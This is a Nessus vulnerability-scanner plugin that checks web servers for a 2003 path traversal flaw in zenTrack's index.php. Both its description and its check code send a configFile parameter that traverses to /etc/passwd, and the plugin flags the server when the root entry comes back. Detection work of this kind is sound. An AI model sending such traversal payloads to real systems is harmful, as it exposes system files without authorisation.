#
# (C) Tenable Network Security, Inc.
#

#
# Ref:
#
# Subject: Re: zenTrack Remote Command Execution Vulnerabilities
# From: gr00vy <groovy2600@yahoo.com.ar>
# To: bugtraq@list-id.securityfocus.com,
# Date: 06 Jun 2003 22:48:43 -0300



include("compat.inc");

if(description)
{
 script_id(11708);
 script_version ("$Revision: 1.21 $");
 script_bugtraq_id(7843);
 script_osvdb_id(4554);

 script_name(english:"zenTrack index.php configFile Parameter Traversal Arbitrary Files Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to file
disclosure attacks." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the remote web server show the content of
arbitrary files by making requests like :

  index.php?configFile=../../../../../../../../../../etc/passwd" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/324264/2003-06-04/2003-06-10/0" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/forum/forum.php?forum_id=283172" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to zenTrack 2.4.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/06/09");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/06/06");
 script_cvs_date("$Date: 2011/03/14 21:48:16 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks for the presence of zenTrack's index.php");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

function check(loc)
{
 local_var r, req;

 r = http_send_recv3(method: "GET", item:string(loc, "/index.php?configFile=../../../../../../../../../etc/passwd"), port:port);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:r[2]))
 {
 	security_warning(port);
	exit(0);
 }
}


foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
